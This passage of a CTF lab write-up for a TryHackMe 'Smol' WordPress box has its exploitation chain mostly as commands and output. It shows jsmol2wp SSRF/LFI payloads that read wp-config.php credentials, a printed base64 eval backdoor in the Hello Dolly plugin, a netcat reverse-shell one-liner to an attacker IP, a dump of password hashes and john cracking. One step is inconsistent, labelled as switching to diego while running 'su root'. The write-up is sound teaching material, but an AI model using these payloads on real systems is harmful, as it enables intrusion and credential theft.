+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://www.smol.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>6.4.3&lt;/generator&gt;
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://www.smol.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>6.4.3&lt;/generator&gt;
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">4</span> vulnerabilities identified:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: WP &lt; 6.5.2 - Unauthenticated Stored XSS
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: 6.4.4
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Stored XSS in HTML API
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: 6.4.5
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Stored XSS in Template-Part Block
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: 6.4.5
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Path Traversal in Template-Part Block
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Fixed in: 6.4.5
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> jsmol2wp
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Latest Version: 1.07 <span class="o">(</span>up to date<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Last Updated: 2018-03-09T10:28:00.000Z
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">2</span> vulnerabilities identified:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: JSmol2WP &lt;<span class="o">=</span> 1.07 - Unauthenticated Cross-Site Scripting <span class="o">(</span>XSS<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2018-20462
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: JSmol2WP &lt;<span class="o">=</span> 1.07 - Unauthenticated Server Side Request Forgery <span class="o">(</span>SSRF<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2018-20463
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
+</span></span></code></pre></div><p>Making another wpscan to get the <code>valid usernames</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wpscan --url http://www.smol.thm/ -e u --passwords /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Enumerating Users <span class="o">(</span>via Passive and Aggressive Methods<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Brute Forcing Author IDs - Time: 00:00:04 &lt;<span class="o">===============================================================================</span>&gt; <span class="o">(</span><span class="m">10</span> / 10<span class="o">)</span> 100.00% Time: 00:00:04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Jose Mario Llado Marti
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> wordpress user
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> admin
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> think
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> wp
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> gege
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> diego
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> xavi
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+</span></span></code></pre></div><h3 id="hydra">hydra</h3>
+<p>Now we have valid usernames, lets use hydra to bruteforce the password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt www.smol.thm http-post-form <span class="s2">&#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fwww.smol.thm%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username&#34;</span>
+</span></span></code></pre></div><p>No luck in getting the credentials.</p>
+<h3 id="arbitrary-file-readlfi---ssrfcve-2018-20463">Arbitrary file read(LFI)  &amp; SSRF(CVE-2018-20463)</h3>
+<p>While searching in internet about the plugin jsmol2wp, we got an interesting result <a href="https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt" target="_blank" rel="noopener">SSRF (CVE-2018-20463)</a>
+.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/4.png" title="Google search" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Google search</strong>
+    </figcaption>  
+</figure>
+
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/5.png" title="Github POC" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Github POC</strong>
+    </figcaption>  
+</figure>
+
+<h4 id="ssrf">SSRF</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl <span class="s1">&#39;http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=http://127.0.0.1/&#39;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">        &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s1">&#39;robots&#39;</span> <span class="nv">content</span><span class="o">=</span><span class="s1">&#39;noindex, nofollow&#39;</span> /&gt;
+</span></span><span class="line"><span class="cl">        &lt;style&gt;img:is<span class="o">([</span><span class="nv">sizes</span><span class="o">=</span><span class="s2">&#34;auto&#34;</span> i<span class="o">]</span>, <span class="o">[</span>sizes^<span class="o">=</span><span class="s2">&#34;auto,&#34;</span> i<span class="o">])</span> <span class="o">{</span> contain-intrinsic-size: 3000px 1500px <span class="o">}</span>&lt;/style&gt;
+</span></span><span class="line"><span class="cl">        &lt;title&gt;AnotherCTF&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;alternate&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;application/rss+xml&#34;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&#34;AnotherCTF &amp;raquo; Feed&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://www.smol.thm/index.php/feed/&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">&lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;alternate&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;application/rss+xml&#34;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&#34;AnotherCTF &amp;raquo; Comments Feed&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://www.smol.thm/index.php/comments/feed/&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><h4 id="arbitrary-file-read-lfi">Arbitrary file read (LFI)</h4>
+<p>Lets use <code>Arbitrary file read</code> to get <code>wp-config.php</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl <span class="s1">&#39;http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php&#39;</span>                                         
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database username */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;wpuser&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database password */
+</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;kbLSF2Vop#lw3rjDZ629*Z%G&#39;</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Here we got an config file, with database credentials of <code>wpuser</code>.</p>
+<p>Lets login as <code>wpuser</code> in wordpress.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/6.png" title="Login: wpuser" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Login: wpuser</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Lets explore the site as authenticated user.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/7.png" title="WP User Home page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>WP User Home page</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Here we got an interesting page.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/8.png" title="Inter3esting page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Inter3esting page</strong>
+    </figcaption>  
+</figure>
+</p>
+<h3 id="webmaster-tasks">Webmaster Tasks!!</h3>
+<p>We found a self note of the administrator/creator for this web app. Below are some interesting points in it.</p>
+<pre tabindex="0"><code>1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of &#34;Hello Dolly&#34; plugin as the site&#39;s code revision.
+5- Input Validation: Validate and sanitize user inputs to prevent attacks like SQL injection and XSS.
+6- [IMPORTANT] Firewall Installation: Install a web application firewall (WAF) to filter incoming traffic.
+8- [IMPORTANT] User Permissions: Assign minimum necessary permissions to users based on roles.
+</code></pre><p>Here plugin named <a href="https://github.com/WordPress/WordPress/blob/master/wp-content/plugins/hello.php" target="_blank" rel="noopener"><code>Hello Dolly</code></a>
+ seems interesting. Lets search for this plugin.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/9.png" title="hello.php" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>hello.php</strong>
+    </figcaption>  
+</figure>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<p>Lets try to get the file using <code>LFI</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl <span class="s1">&#39;http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-content/plugins/hello.php&#39;</span>
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">Plugin Name: Hello Dolly
+</span></span><span class="line"><span class="cl">Version: 1.7.2
+</span></span><span class="line"><span class="cl">*/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> hello_dolly_get_lyric<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        /** These are the lyrics to Hello Dolly */
+</span></span><span class="line"><span class="cl">        <span class="nv">$lyrics</span> <span class="o">=</span> <span class="s2">&#34;Hello, Dolly
+</span></span></span><span class="line"><span class="cl"><span class="s2">Well, hello, Dolly
+</span></span></span><span class="line"><span class="cl"><span class="s2">It&#39;s so nice to have you back where you belong
+</span></span></span><span class="line"><span class="cl"><span class="s2">You&#39;re lookin&#39; swell, Dolly
+</span></span></span><span class="line"><span class="cl"><span class="s2">I can tell, Dolly
+</span></span></span><span class="line"><span class="cl"><span class="s2">...
+</span></span></span><span class="line"><span class="cl"><span class="s2">...
+</span></span></span><span class="line"><span class="cl"><span class="s2">Dolly&#39;ll never go away again&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // Here we split it into lines.
+</span></span><span class="line"><span class="cl">        <span class="nv">$lyrics</span> <span class="o">=</span> explode<span class="o">(</span> <span class="s2">&#34;\n&#34;</span>, <span class="nv">$lyrics</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        // And <span class="k">then</span> randomly choose a line.
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> wptexturize<span class="o">(</span> <span class="nv">$lyrics</span><span class="o">[</span> mt_rand<span class="o">(</span> 0, count<span class="o">(</span> <span class="nv">$lyrics</span> <span class="o">)</span> - <span class="m">1</span> <span class="o">)</span> <span class="o">]</span> <span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// This just echoes the chosen line, we<span class="s1">&#39;ll position it later.
+</span></span></span><span class="line"><span class="cl"><span class="s1">function hello_dolly() {
+</span></span></span><span class="line"><span class="cl"><span class="s1">        eval(base64_decode(&#39;</span><span class="nv">CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA</span><span class="o">=</span><span class="err">&#39;</span><span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>In PHP, <code>eval()</code> is a language construct used to evaluate a string of PHP code. <code>The string is treated as PHP code and executed at runtime</code>. It&rsquo;s often used to dynamically execute code generated at runtime or passed as a string.</p>
+<p>We got something interesting lets base64 decode it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA</span><span class="o">=</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&#34;\143\155\x64&#34;</span><span class="o">]))</span> <span class="o">{</span> system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&#34;\143\x6d\144&#34;</span><span class="o">])</span><span class="p">;</span> <span class="o">}</span>
+</span></span></code></pre></div>
+
+
+
+<figure>
+    <img src="/posts/thm/smol/10.png" title="Decoding using AI" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Decoding using AI</strong>
+    </figcaption>  
+</figure>
+
+<p>We can run system commands using the following code.</p>
+<pre tabindex="0"><code>if (isset($_GET[&#34;cmd&#34;])) { system($_GET[&#34;cmd&#34;]); }
+</code></pre><p>Here we can see traces of executing <code>hello_dolly</code> method. Lets try to run a shell command.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/12.png" title="Traces of Executing hello_dolly" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Traces of Executing hello_dolly</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Lets try some commands here.
+
+
+
+
+<figure>
+    <img src="/posts/thm/smol/11.png" title="shell commands" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>shell commands</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Lets try to get the reverse shell command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://www.smol.thm/wp-admin/?cmd<span class="o">=</span>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff<span class="p">|</span>sh%20-i%202%3E%261<span class="p">|</span>nc%2010.17.62.140%2012345%20%3E%2Ftmp%2Ff
+</span></span></code></pre></div><p>Executing <code>url encoded payload</code> in the browser to get the shell back. (Listener need to be started, before executing it.)</p>
+<h3 id="improving-shell">Improving shell</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">^Z <span class="c1">#(Ctrl+Z)</span>
+</span></span><span class="line"><span class="cl">stty raw -echo <span class="o">&amp;&amp;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><h3 id="shell-as-diego">Shell as diego</h3>
+<pre tabindex="0"><code>www-data@smol:/$ mysql -u wpuser -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 43
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+mysql&gt;
+</code></pre><p>Lets explore mysql database.</p>
+<pre tabindex="0"><code>mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| ****************** |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql&gt; use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------------+
+| Tables_in_wordpress       |
++---------------------------+
+| **************            |
+| wp_users                  |
+| ******************        |
++---------------------------+
+42 rows in set (0.00 sec)
+
+mysql&gt; select * from wp_users
+    -&gt; ;
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
+|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
+|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
+|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
+|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+6 rows in set (0.00 sec)
+</code></pre><p>We got password hashes of all users in the machine. Lets create unshadow file to bruteforce passwords.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat unshadow.txt 
+</span></span><span class="line"><span class="cl">admin:<span class="nv">$P$BH</span>.CF15fzRj4li7nR19CHzZhPmhKdX.
+</span></span><span class="line"><span class="cl">wpuser:<span class="nv">$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1</span>/E.
+</span></span><span class="line"><span class="cl">think:<span class="nv">$P$BOb8</span>/koi4nrmSPW85f5KzM5M/k2n0d/
+</span></span><span class="line"><span class="cl">gege:<span class="nv">$P$B1UHruCd</span>/9bGD.TtVZULlxFrTsb3PX1
+</span></span><span class="line"><span class="cl">diego:<span class="nv">$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1</span>
+</span></span><span class="line"><span class="cl">xavi:<span class="nv">$P$BB4zz2JEnM2H3WE2RHs3q18</span>.1pvcql1
+</span></span></code></pre></div><p>By bruteforcing the hashes we got valid password for user <code>diego</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ john unshadow.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">sandiegocalifornia <span class="o">(</span>diego<span class="o">)</span> 
+</span></span></code></pre></div><p>Lets switch to <code>diego</code> using <code>su</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@smol:/$ su root
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">diego@smol:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">45edaec***********6b7ce72b86963
+</span></span></code></pre></div><!--flag1{45edaec653ff9ee06236b7ce72b86963}-->
+<p>Here we got our firat flag for the CTF.</p>
+<h3 id="shell-as-think">Shell as think</h3>
+<p>We should be able to read the home directory of other users.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diego@smol:~$ id
